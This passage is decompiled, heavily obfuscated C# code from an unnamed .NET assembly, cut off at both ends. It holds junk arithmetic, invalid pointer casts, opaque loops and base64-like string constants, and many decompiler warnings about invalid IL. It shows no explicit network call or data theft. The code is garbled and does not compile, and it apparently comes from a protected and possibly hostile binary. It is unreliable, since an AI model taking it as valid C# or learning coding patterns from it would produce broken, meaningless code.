					text = "GV47ED3suSTdngEjZLUJfkDn5EhKqgkeQJPfMpGcSVVh6B5Sf/kYWeHQwZrBYrFf0DBB3OFkMoLpdurFVgIj";
					BindingFlags bindingFlags_4 = (BindingFlags)((short*)11823)->ToString(text3);
					Type type_4 = type;
					array = null;
					_003F val2;
					checked
					{
						ulong num22 = unchecked((ulong)num20) - (unchecked((ulong)num21) + unchecked((ulong)(long)Class1.smethod_3(bindingFlags_4, propertyInfo_, type_4, type_5, parameterModifier_)));
						long num23 = num2;
						string s4 = text;
						ushort num8 = 33853;
						num8 = num24;
						object obj17 = ulong.Parse(s4, unchecked((NumberStyles)((byte*)(byte)((ushort*)num25)->ToString(text))->ToString()), null);
						val2 = num22 + (num23 + ((obj17 is long) ? obj17 : null) - unchecked((long)Class5.smethod_3())) * (unchecked((ulong)(long)((long*)(long)Class5.smethod_2())->ToString(text)) - unchecked((ulong)num2));
						text = text;
					}
					ulong num27 = 2099316800uL / checked(num26 + 865008268uL);
					object obj18 = ((bool*)1)->Equals(flag);
					_003F val3 = checked(num27 - ((obj18 is ulong) ? obj18 : null));
					string s5 = string.IsNullOrEmpty("BsmiFVgYOr8jyx/LsRAJpIZp/0GO2HpRAbwJ7kj2I9MU7kNjEi+JWQWN3ZK3Br2P8ToysV/+CkmdzhePu30y") as string;
					string s6 = (string)(object)Class5.smethod_3();
					num9 = num9;
					int bindingFlags_5 = (int)/*isinst with value type is only supported in some contexts*/;
					uint num28;
					checked
					{
						num28 = 2429410025u * unchecked((uint)num9);
					}
					object obj19 = ushort.Parse(((IntPtr*)checked(unchecked((nuint)(nint)(IntPtr)((short*)num29)->ToString("ctWsekG0ZjjLofFw7+lOCb9KrMomgQ+ElddPzIWpvOqaRPP0v6SAb8vJR2NXDVwQ2At8NLoxpqJssDUflxqy", (IFormatProvider)(object)Class0.smethod_0())) + unchecked((nuint)num3)))->ToInt32() as string);
					formatProvider = ushort.Parse(s5, (NumberStyles)Class2.smethod_0((BindingFlags)bindingFlags_5, (MethodBase[])(object)((int*)checked(num28 * ((obj19 is int) ? obj19 : null)))->ToString(text), char.IsDigit(text, -180776664) as Type[], parameterModifier_), formatProvider) as IFormatProvider;
					_ = (long)((long*)val2)->ToString(text4, ((ulong*)val3)->Equals(checked(unchecked((ulong)((ushort*)25546)->ToString(formatProvider3)) + num26)) as IFormatProvider);
					num2 = 234566986L;
					byte[] byte_4 = null;
					short num30 = (short)Class1.smethod_0(byte_5, byte_4);
					text = text;
					object obj20 = ((long*)((ulong)num31 / (ulong)(long)((short*)num30)->ToString(text5, short.Parse(text) as IFormatProvider)))->Equals(234566986L);
					object obj21 = ((byte*)(47u / checked(b6 - (unchecked(num19 / (byte)((ushort*)((obj20 is ushort) ? obj20 : null))->ToString()) + b)) / 58u))->GetTypeCode();
					obj22 = ((obj21 is bool) ? obj21 : null);
					num32 = flag;
					bindingFlags = bindingFlags;
					array = ((sbyte*)24)->Equals((sbyte)((uint)b2 / 105u)) as Type[];
					string s7 = text;
					NumberStyles style3 = numberStyles;
					IFormatProvider provider3 = int.TryParse("guUxq0z5K3CyEYCR2NkuDFnvoodBl1a1SCpyYviohwMupaFT31GEwcA6cp723vqGGUJPngMqVxg6PqhTakLM", out result5) as IFormatProvider;
					ref sbyte result3 = ref *(sbyte*)null;
					string strA = sbyte.TryParse(s7, style3, provider3, out result7) as string;
					ulong num33 = num26;
					BindingFlags bindingFlags_6 = bindingFlags;
					array2 = null;
					MethodBase[] methodBase_ = array2;
					int totalWidth = (int)Class5.smethod_3();
					NumberStyles style4 = numberStyles;
					IFormatProvider provider4 = formatProvider;
					reference3 = ref reference3;
					object obj23 = byte.TryParse("e2hR15NASUQwdMST9x9W2L4pEpPkb80YeoTQg7dJqMSmsPIUFVsFC8pBi880bNFG4v2ZobmzSV5FPw/6Qmvi", style4, provider4, out result8);
					object obj24 = ((ulong*)checked(804541555uL - num33 * (66012305uL + unchecked((ulong)Class1.smethod_1(bindingFlags_6, methodBase_, ushort.TryParse(((nint)((IntPtr)"CGxo3hEYuNl9G5TqSRSMemm7mUu1rje0GXzYCyyDqSOOXCi4xXV5zLp5o3dfGCUk/izhjryyxsDN8uMWdezR".PadRight(totalWidth, (char)(int)((obj23 is char) ? obj23 : null)) + -1701155394)) as string, out *(ushort*)Settings.Default) as Type[], parameterModifier_)))))->GetTypeCode();
					object obj25 = ((obj24 is int) ? obj24 : null);
					text = text;
					object obj26 = byte.Parse("aDV7jfmoVPgiMNDiQj3LMD1fB0EF90RQNYEpxBA8Ag4HOqWhUtsoT5XQu9h4xJFLGopHzlqEzEa/ooFkFEkt", (NumberStyles)/*isinst with value type is only supported in some contexts*/);
					object obj27 = ((uint*)checked(271524764 * ((obj26 is uint) ? obj26 : null)))->Equals(1844206416u);
					_ = (short)((sbyte*)((obj27 is sbyte) ? obj27 : null))->ToString((IFormatProvider?)null);
					string s8 = text;
					object obj28 = (nint)(IntPtr)ptr;
					reference3 = ref *(byte*)((obj28 is ref byte) ? obj28 : null);
					object obj29 = byte.TryParse(s8, out result9);
					num29 = (short)checked(((obj29 is short) ? obj29 : null) - -29991);
					_ = ((short*)num34)->GetHashCode() is ParameterModifier[];
					parameterModifier_ = (ParameterModifier[])(object)Class0.smethod_0();
					parameterModifier_ = array3;
					style5 = (NumberStyles)Class2.smethod_0(bindingFlags_7, null, type_6, parameterModifier_2);
					num = 253680570u;
				}
				while (checked(obj22 * unchecked((num32 ? ((bool*)1) : ((bool*)null))->Equals(ushort.Parse("dv0jVGqvK2No1mVM9YdFb5Tu5LGniWjpk5rvWHJY+2G8CuJQjhSE91py5m82Xsmrf8jABy2rS0msmJNbLC4S", style5, ((uint*)num35)->GetHashCode() as IFormatProvider) as object))) != 0);
			}
		}
		finally
		{
			try
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] methodBase_2);
				do
				{
					bindingFlags = default(BindingFlags);
					bindingFlags = bindingFlags;
					array2 = null;
					ulong num26 = (ulong)Class2.smethod_0(default(BindingFlags), methodBase_2, null, parameterModifier_);
					Class2 obj30 = (Class2)(object)Class1.smethod_0(null, (byte[])(object)Settings.Default);
					@class = null;
					@class = obj30;
					num3 = (IntPtr)Class0.smethod_0();
					object obj31 = ((ulong*)(ulong)Settings.Default)->GetTypeCode();
					_ = ((long)(IntPtr)(nint)checked(unchecked((nuint)unchecked((nint)default(IntPtr))) * ((obj31 is IntPtr) ? obj31 : null))) is Struct3;
				}
				while (flag);
			}
			finally
			{
				while (flag)
				{
					num3 = default(IntPtr);
					int num9 = ((ulong*)(ulong)(object)((IntPtr*)num3)->ToPointer())->GetHashCode();
				}
				goto IL_084c;
			}
		}
		IL_084c:
		if (!((byte)Class0.smethod_0() != 0))
		{
			while (true)
			{
				_ = char.IsSurrogate((char)checked(c - c)) is _003CModule_003E;
			}
		}
		text = text;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string string_2);
		_ = (Class5)(object)Class1.smethod_1((BindingFlags)Class5.smethod_0(string_2), array2, array, null);
		@class = @class;
		checked
		{
			ulong num26 = 1402047954uL - unchecked((ulong)string.Format("RcCipBaqzLOd/zIDOenDf1RlwWEnl+eHbwOAulJblxwnqyBAfaXOFdb1yVzT5zT2gZwU4OY8xFkyZFTC85pe", null));
		}
		_ = ((ulong*)(ulong)Settings.Default)->Equals(2854547358664133979uL) is uint;
		Struct4 @struct = @struct;
		@struct = default(Struct4);
		@struct = default(Struct4);
		object obj32 = (long)(IntPtr)Class2.smethod_0(bindingFlags, (MethodBase[])(object)Class0.smethod_0(), (Type[])(object)Settings.Default, null);
		BindingFlags bindingFlags_8 = (BindingFlags)(object)((IntPtr*)checked(((obj32 is IntPtr) ? obj32 : null) + num3))->ToPointer();
		parameterModifier_ = null;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_3);
		_ = (Resources)(object)Class2.smethod_2(bindingFlags_8, propertyInfo_, null, null, parameterModifier_3);
		text = "CPXyBmZhy4x5pVRVb9mANqit7UkWXdR3eF12qwjaII/m7kQ5J9cgBE4VIXrN0+E1VpeKGnar3fvV4dRN9QHn";
		text = "QN6KP5lkIWfGB6CvQKmffk8nqO9AveoV84xAJMCdKVEZtZN/xIgdb0x9B+4z4SvmLDQdSLe7KDU231lbk85v";
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s9);
		object obj33 = byte.Parse(s9, formatProvider);
		string text6 = char.ConvertFromUtf32((int)((char*)((obj33 is char) ? obj33 : null))->ToString());
		StringComparison stringComparison = stringComparison;
		object obj34 = text6.StartsWith("iNWnvYECBzoa6jDCu/sRgRm6T3oR6XmD/ipskL2GGF+fJ0P2jzlnFj2JY6dnvMhVnD3HY/d4PxkLW8Uo4NHk", stringComparison);
		_ = ((IntPtr*)((obj34 is IntPtr) ? obj34 : null))->Equals(obj7) is _003CModule_003E;
		_ = (((byte)Settings.Default != 0) ? 1u : 0u) / (checked(((unchecked((byte)Settings.Default) != 0) ? 1u : 0u) - 1u) / 0u);
		flag = false;
	}

	unsafe static void smethod_2(bool bool_0, byte byte_1, IntPtr intptr_0, object object_0, bool bool_1, byte byte_2, IntPtr intptr_1, object object_1)
	{
		//IL_0033: Expected O, but got I
		//IL_0080: Expected O, but got I4
		//IL_00a3: Expected O, but got I4
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got I4
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got I4
		//IL_014a: Expected O, but got I4
		//IL_0166: Expected O, but got I4
		//IL_016c: Expected I4, but got O
		//IL_01cf: Expected O, but got I4
		//IL_01ed: Expected O, but got I4
		//IL_01f3: Expected I4, but got O
		//IL_0206: Expected O, but got I8
		//IL_0214: Expected O, but got I4
		//IL_021e: Expected O, but got I4
		//IL_0228: Expected O, but got I4
		//IL_0267: Expected O, but got I4
		//IL_02d4: Expected O, but got I4
		//IL_02d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ef: Expected Ref, but got Unknown
		//IL_0310: Expected O, but got I4
		//IL_0333: Expected O, but got I4
		//IL_0339: Expected I4, but got O
		//IL_034d: Expected O, but got I4
		//IL_0351: Unknown result type (might be due to invalid IL or missing references)
		//IL_0352: Unknown result type (might be due to invalid IL or missing references)
		//IL_0367: Expected O, but got I4
		//IL_036b: Unknown result type (might be due to invalid IL or missing references)
		//IL_036c: Unknown result type (might be due to invalid IL or missing references)
		//IL_036d: Unknown result type (might be due to invalid IL or missing references)
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_036f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0386: Expected O, but got I8
		//IL_0396: Expected O, but got I4
		//IL_03a2: Expected I4, but got O
		//IL_03a3: Expected O, but got I4
		//IL_03b2: Expected O, but got I
		//IL_03bc: Expected O, but got I4
		//IL_03ca: Expected I4, but got O
		//IL_0400: Expected O, but got I4
		//IL_0404: Unknown result type (might be due to invalid IL or missing references)
		//IL_041f: Expected O, but got I4
		//IL_0445: Expected O, but got I4
		//IL_044e: Expected I4, but got O
		//IL_044e: Expected Ref, but got Unknown
		//IL_044f: Expected O, but got I4
		//IL_0453: Unknown result type (might be due to invalid IL or missing references)
		//IL_0454: Unknown result type (might be due to invalid IL or missing references)
		//IL_0482: Unknown result type (might be due to invalid IL or missing references)
		//IL_048a: Expected Ref, but got Unknown
		//IL_048b: Expected O, but got I4
		//IL_049f: Expected O, but got I4
		//IL_04aa: Expected I4, but got O
		//IL_04ab: Expected O, but got I8
		//IL_04cb: Expected O, but got I4
		//IL_04e4: Expected O, but got I4
		//IL_04fc: Expected O, but got I4
		//IL_0515: Expected O, but got I8
		//IL_0549: Expected O, but got I4
		//IL_054f: Expected I8, but got O
		//IL_056f: Expected O, but got I4
		//IL_057b: Expected O, but got I4
		//IL_0580: Unknown result type (might be due to invalid IL or missing references)
		//IL_0588: Expected Ref, but got Unknown
		//IL_059d: Expected O, but got I4
		//IL_05c2: Expected O, but got I4
		//IL_05c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d9: Expected O, but got I4
		//IL_05dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f7: Expected O, but got I4
		//IL_0601: Expected O, but got I4
		//IL_060a: Expected Ref, but got Unknown
		//IL_063c: Expected O, but got I4
		//IL_0646: Expected O, but got I4
		//IL_065b: Expected O, but got I4
		//IL_0665: Expected O, but got I4
		//IL_066e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0689: Expected I4, but got Unknown
		//IL_0719: Expected O, but got I4
		//IL_0727: Expected I4, but got O
		//IL_0741: Expected O, but got I4
		//IL_0750: Expected O, but got I4
		//IL_0766: Expected O, but got I4
		//IL_079f: Expected O, but got I4
		//IL_07bc: Expected O, but got I4
		//IL_07c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c4: Expected I4, but got Unknown
		//IL_07cc: Expected O, but got I4
		//IL_0826: Expected O, but got I4
		//IL_0859: Expected O, but got I4
		//IL_086d: Expected O, but got I4
		//IL_087c: Expected O, but got I
		//IL_0880: Unknown result type (might be due to invalid IL or missing references)
		//IL_0881: Unknown result type (might be due to invalid IL or missing references)
		//IL_0887: Expected I4, but got Unknown
		//IL_0888: Expected O, but got I4
		//IL_08b2: Expected O, but got I8
		//IL_08e3: Expected O, but got I4
		//IL_08f3: Expected I4, but got O
		//IL_08f4: Expected O, but got I4
		//IL_0917: Expected O, but got I4
		//IL_0933: Expected O, but got I4
		//IL_093c: Expected I4, but got O
		//IL_093d: Expected O, but got I4
		//IL_09a5: Expected O, but got I4
		//IL_09a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09e8: Expected O, but got I4
		//IL_09f1: Expected I4, but got O
		//IL_09f2: Expected O, but got I4
		//IL_09f8: Expected Void, but got O
		//IL_0a0e: Expected O, but got I4
		//IL_0a28: Expected O, but got I4
		//IL_0a68: Expected O, but got I4
		//IL_0a6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a7a: Expected I4, but got Unknown
		//IL_0a81: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a95: Expected O, but got I4
		//IL_0a9f: Expected O, but got I4
		//IL_0aa8: Expected I4, but got O
		//IL_0aa9: Expected O, but got I4
		//IL_0aad: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ac1: Expected O, but got I4
		//IL_0ad1: Expected O, but got I4
		//IL_0ada: Expected I4, but got O
		//IL_0aea: Expected O, but got I4
		//IL_0af9: Expected O, but got I8
		//IL_0afe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b04: Expected Ref, but got Unknown
		//IL_0b05: Expected O, but got I4
		//IL_0b12: Expected O, but got I8
		//IL_0b17: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b19: Expected I4, but got Unknown
		//IL_0b32: Expected O, but got I4
		//IL_0b42: Expected O, but got I4
		//IL_0b48: Expected I4, but got O
		//IL_0b58: Expected O, but got I4
		//IL_0b6f: Expected O, but got I4
		//IL_0bb1: Expected O, but got I4
		//IL_0be3: Expected O, but got I4
		//IL_0be7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf2: Expected Ref, but got Unknown
		//IL_0c0e: Expected O, but got I4
		//IL_0c15: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c26: Expected Ref, but got Unknown
		//IL_0c27: Expected O, but got I
		//IL_0c4c: Expected O, but got I4
		//IL_0c69: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6f: Expected I8, but got Unknown
		//IL_0c70: Expected O, but got I4
		//IL_0c7a: Expected O, but got I4
		byte[] array = array;
		BindingFlags bindingFlags_ = (BindingFlags)Class1.smethod_0(array, array);
		Type[] array2 = (Type[])(object)Class0.smethod_0();
		Type[] type_ = array2;
		_ = (IntPtr)Settings.Default;
		nint intPtr = intPtr;
		IntPtr pointer = intPtr;
		int num = num;
		ParameterModifier[] array3 = ((nint)IntPtr.Subtract(pointer, num)) as ParameterModifier[];
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array4);
		array3 = array4;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles numberStyles);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		uint num2;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		if (!((byte)Class2.smethod_2(bindingFlags_, null, null, type_, array3) != 0))
		{
			try
			{
				try
				{
					_ = (Resources)(object)Class5.smethod_3();
				}
				finally
				{
					text = text;
					string s = text;
					numberStyles = numberStyles;
					formatProvider = formatProvider;
					_ = sbyte.Parse(s, default(NumberStyles), formatProvider) is Class0;
					goto end_IL_004e;
				}
				end_IL_004e:;
			}
			finally
			{
				num2 = checked(332667283u - 834783541u);
				uint num3 = num2;
				object obj = IntPtr.Size;
				_003F val = checked(1972634985 - unchecked(((obj is uint) ? obj : null) / 796081414)) / 1779163188;
				string s2 = text;
				numberStyles = default(NumberStyles);
				object obj2 = sbyte.Parse(s2, numberStyles);
				_ = num3 / checked(val * ((obj2 is uint) ? obj2 : null));
				num2 = 1568448559u;
				goto IL_00d6;
			}
		}
		goto IL_00d6;
		IL_0948:
		System.Runtime.CompilerServices.Unsafe.SkipInit(out sbyte b);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type type_2);
		string strB;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out char c);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num9);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider provider);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Type[] type_3);
		object obj9;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out nint num10);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out short num7);
		BindingFlags bindingFlags;
		do
		{
			bool num4 = flag;
			uint num5;
			checked
			{
				num5 = unchecked((uint)b / 84u) * unchecked((uint)b);
			}
			sbyte num6 = (sbyte)Class5.smethod_1(text);
			_ = (Type)(object)Settings.Default;
			type = type;
			object obj4 = ((sbyte*)(num5 / checked(unchecked((uint)num6) + unchecked((uint)(sbyte)Class2.smethod_2(default(BindingFlags), null, type_2, array2, array3)) + unchecked((uint)(sbyte)"Wt31552cxwGKw8MJ0TzrCmz7+ActY9h90djjC6itTnXu42T/NRwLBWnWitLooPEAgYqPVzE=".Substring(num)))))->CompareTo(obj3);
			if ((int)checked(num4 + ((obj4 is bool) ? obj4 : null)) == 0)
			{
				while (true)
				{
					string s3 = text;
					object obj5 = ((sbyte*)checked(103u * unchecked((uint)(sbyte)Class0.smethod_0())))->CompareTo(obj3);
					if (sbyte.Parse(s3, (NumberStyles)((obj5 is NumberStyles) ? obj5 : null)) is bool)
					{
						_ = (Class2)(object)Class5.smethod_3();
						_ = ((short*)num7)->CompareTo(29357) is GClass0;
						continue;
					}
					break;
				}
			}
			string s4 = text;
			numberStyles = default(NumberStyles);
			strB = uint.Parse(s4, numberStyles) as string;
			bindingFlags = default(BindingFlags);
			IntPtr num8 = (IntPtr)Class2.smethod_2(default(BindingFlags), null, null, null, array3);
			string strA = text;
			string strB2 = char.IsSeparator(c) as string;
			object obj6 = char.ToUpperInvariant((char)Settings.Default);
			object obj7 = ((obj6 is bool) ? obj6 : null);
			num = num;
			object obj8 = (nint)(IntPtr)num9;
			_ = string.Compare(strA, strB2, (byte)checked(obj7 - unchecked(0 / ((obj8 is bool) ? obj8 : null))) != 0) is BindingFlags;
			bindingFlags = bindingFlags;
			MethodBase[] methodBase_ = (MethodBase[])(object)Class5.smethod_3();
			string s5 = text;
			formatProvider = null;
			array2 = ulong.Parse(s5, provider) as Type[];
			intPtr = (IntPtr)Class1.smethod_1(default(BindingFlags), methodBase_, type_3, (ParameterModifier[])(object)Settings.Default);
			obj9 = (IntPtr)(nint)checked(unchecked((nuint)(nint)num8) * unchecked((nuint)num10) * unchecked((nuint)(nint)(IntPtr)Class0.smethod_0())) == (IntPtr)intPtr;
		}
		while (string.Compare("eoiYo8X0rKa+6czfRXQ0V+kKUr7xz5iqgfniKW3/oAzFG6xuvmYsgv6OAmEYtKTayOMJ5QA=", 1355354901, strB, (int)((obj9 is int) ? obj9 : null), 1656455897, flag) is bool);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags_2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out PropertyInfo[] propertyInfo_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag2);
		do
		{
			bindingFlags = default(BindingFlags);
			bindingFlags = default(BindingFlags);
			object obj10 = ((ulong*)(ulong)Class2.smethod_2(bindingFlags_2, propertyInfo_, null, array2, (ParameterModifier[])(object)Settings.Default))->GetHashCode();
			object obj11 = char.IsLetterOrDigit((char)(int)((obj10 is char) ? obj10 : null));
			void @void = ((obj11 is void) ? obj11 : null);
			@void = @void;
			flag = false;
		}
		while (0u / (flag2 ? 1u : 0u) != 0);
		object obj12 = ((uint*)num2)->CompareTo(null);
		object obj13 = ((obj12 is bool) ? obj12 : null);
		int num11 = num;
		string strA2 = byte.Parse("ebZgUz2eXkHyrg1ud1T+5lPf0EonNNkCcI1KnlHTE18JzVxR2t84+fzO2502wY0MGLWO3T0=") as string;
		Type[] type_4 = (Type[])(object)Class1.smethod_0(array, null);
		array3 = array3;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] array5);
		array3 = array5;
		ref _003F reference = ref *(_003F*)num11;
		uint num12;
		object obj14;
		checked
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_);
			num12 = 3825053199u + unchecked((uint)(int)Class1.smethod_3(default(BindingFlags), propertyInfo_, null, type_4, parameterModifier_));
			obj14 = ((bool*)null)->Equals(obj3);
		}
		_003F val2 = obj13 / System.Runtime.CompilerServices.Unsafe.As<_003F, int>(ref reference).Equals((int)checked(1247317720u - (699819487u + unchecked((uint)string.Compare(strA2, (int)checked(num12 - ((obj14 is int) ? obj14 : null)), text, 1538324492, num)))));
		flag = flag;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag3);
		object obj15 = ((bool*)checked((flag3 ? 1u : 0u) + ((flag ? 1u : 0u) + 0u)))->CompareTo((byte)(int)/*isinst with value type is only supported in some contexts*/ != 0);
		if (checked(val2 - ((obj15 is bool) ? obj15 : null)) != 0)
		{
			return;
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out char[] anyOf);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref byte result);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out MethodBase[] methodBase_2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ulong num16);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Resources resources);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte obj21);
		try
		{
			if (!flag)
			{
				object obj16 = text.IndexOfAny(anyOf);
				_ = (byte)Class2.smethod_0((BindingFlags)((obj16 is BindingFlags) ? obj16 : null), null, array2, byte.TryParse(text, out result) as ParameterModifier[]);
				_ = ushort.Parse(text, formatProvider) is ulong;
				object obj17 = long.Parse(text, numberStyles);
				_ = ((int*)(((obj17 is int) ? obj17 : null) / num))->GetHashCode() is Class4;
				object obj18 = long.Parse(text);
				num = checked(((obj18 is int) ? obj18 : null) - num);
				return;
			}
			bool num14 = flag;
			string obj19 = bool.TryParse(text, out *(bool*)null) as string;
			obj3 = obj3;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out object value);
			object obj20 = obj19.CompareTo(value);
			obj21 = (byte)(int)((obj20 is byte) ? obj20 : null);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b2);
			Class3 @class = ((bool*)checked((num14 ? 1u : 0u) - ((unchecked((byte)((byte*)20)->ToString(((byte*)((uint)b2 / 226u))->Equals(obj21) as string)) != 0) ? 1u : 0u)))->CompareTo(flag) as Class3;
			num7 = -3781;
			bindingFlags = default(BindingFlags);
			BindingFlags bindingFlags_3 = bindingFlags;
			Type type_5 = type;
			object obj22 = ((byte*)215)->CompareTo((byte)Class2.smethod_0(bindingFlags, methodBase_2, array2, array3));
			object obj23 = ((obj22 is ushort) ? obj22 : null);
			formatProvider = formatProvider;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider2);
			Type[] type_6 = (Type[])(object)((ushort*)obj23)->ToString(formatProvider2);
			array3 = (ParameterModifier[])(object)Class5.smethod_2();
			System.Runtime.CompilerServices.Unsafe.SkipInit(out short num15);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out ParameterModifier[] parameterModifier_2);
			object obj24 = ((short*)num15)->CompareTo((short)Class2.smethod_2(bindingFlags_3, propertyInfo_, type_5, type_6, parameterModifier_2));
			_ = (byte)((ulong*)checked(1073790505L - ((obj24 is ulong) ? obj24 : null)))->ToString("tSEPruZHWIPYZEyIB92Vzt0zsA6GlJPhivJJN+ADvWIDVr9/KBnX8qXhYzrNZVFZ9jbNpHI=") != 0;
			resources = resources;
			string text2 = text;
			object obj25 = char.IsWhiteSpace((char)Class5.smethod_2());
			_ = text2 + (string)(object)((IntPtr*)(((obj25 is IntPtr) ? obj25 : null) / ((nuint)intPtr / (nuint)intPtr) / (nuint)(nint)(IntPtr)Class5.smethod_2()))->ToPointer() + "8fh5YmVxb7ULqKmSx2elgiXaecfrn9we5oFOsqogm/svklthllZwTceQzbutC+0yMAGp4fs=" + text;
			text = text;
			return;
		}
		finally
		{
			ref _003F reference2 = ref *(_003F*)num16;
			object obj26 = sbyte.Parse("gQO6/S36cWF3rxXs5fbt+Rz1WlRp9i9xFIdhhE/bP59gBlKBtIhjWEP84j/4mwIMAR9Pro8=", null);
			object obj27 = System.Runtime.CompilerServices.Unsafe.As<_003F, ulong>(ref reference2).CompareTo((ulong)(long)checked(((obj26 is ulong) ? obj26 : null) - unchecked(checked(num16 - unchecked(8912894uL / num16)) / 241275608uL)));
			_ = ((ulong*)((obj27 is ulong) ? obj27 : null))->GetHashCode() is Class5;
			Class5 class2 = (Class5)(object)Class0.smethod_0();
			return;
		}
		IL_00d6:
		string[] array6 = array6;
		string s6 = string.Concat(array6);
		num2 = (uint)((int*)num)->ToString("yqOXpQYj2vnciPtASQTJhGMwyajIjFs9XhWuKusugTIjFaU/IDEYjMm7lHyiq/Qea7SHZI+NlD+fqiyjYPDh");
		System.Runtime.CompilerServices.Unsafe.SkipInit(out uint num17);
		bindingFlags = (BindingFlags)((uint*)num17)->ToString(formatProvider);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out BindingFlags bindingFlags2);
		bindingFlags = bindingFlags2;
		MethodBase[] methodBase_3 = sbyte.Parse(text, (NumberStyles)((IntPtr*)(IntPtr)Class5.smethod_1("RO1BNNA6IsQIWgnqekhBK/HGwWV9Cs16FkpAs1eDodhBVzfH6Ip/WWuMToOAMTLlzdRjdx1ZazQWuH1pWsAR"))->ToString("pXZiFW3dufhbEtjSNjUQK3PgfZFvyCJe7qf6wupjtIYjRhI+NNilfLzH8aHhCm+E8SwAM8I7XHL4CVSkTyIP"), formatProvider) as MethodBase[];
		Type[] type_7 = sbyte.TryParse("mOoc8eQCddjuoF88ejX0a2T/bIdEViw8WGM7VVxmcJrx6VFi8j8dUmf9Y6wYAW3W+xcMtkhNzmJiOtoVtp//", out *(sbyte*)null) as Type[];
		object obj28 = ((long*)1511331979L)->GetTypeCode();
		ushort num18 = (ushort)(int)((obj28 is ushort) ? obj28 : null);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out long num13);
		if (checked(1u + (char.IsWhiteSpace(s6, unchecked((int)Class1.smethod_1(default(BindingFlags), methodBase_3, type_7, (ParameterModifier[])(object)((ulong*)1402158496L)->ToString(((ushort*)num18)->ToString((IFormatProvider?)null))))) ? 1u : 0u)) == 0)
		{
			_ = (byte)Settings.Default != 0;
		}
		else
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag4);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag5);
			while (flag)
			{
				try
				{
					uint num19 = checked(0u * (flag ? 1u : 0u));
					c = '\ue493';
					flag = char.IsSymbol('\ue493');
					flag = (byte)checked(1u - (flag4 ? 1u : 0u)) != 0;
					uint num20 = checked(num19 - (flag5 ? 1u : 0u)) / 1u;
					flag = (byte)num20 != 0;
					_ = ((bool*)num20)->GetTypeCode() is sbyte;
					num13 = 154192232L;
					object obj29 = ((long*)154192232L)->GetTypeCode();
					b = (sbyte)(int)((obj29 is sbyte) ? obj29 : null);
					b = 2;
				}
				catch
				{
					string s7 = long.Parse(text) as string;
					NumberStyles style = numberStyles;
					IFormatProvider provider2 = sbyte.Parse(text) as IFormatProvider;
					object obj30 = IntPtr.Size;
					_ = byte.TryParse(s7, style, provider2, out *(byte*)((obj30 is ref byte) ? obj30 : null)) is Class5;
					Class5 class2 = (Class5)(object)Settings.Default;
					class2 = class2;
				}
			}
		}
		num16 = num16;
		num16 = 270676027uL;
		try
		{
			if (!(((sbyte*)(sbyte)Settings.Default)->CompareTo(obj3) is bool))
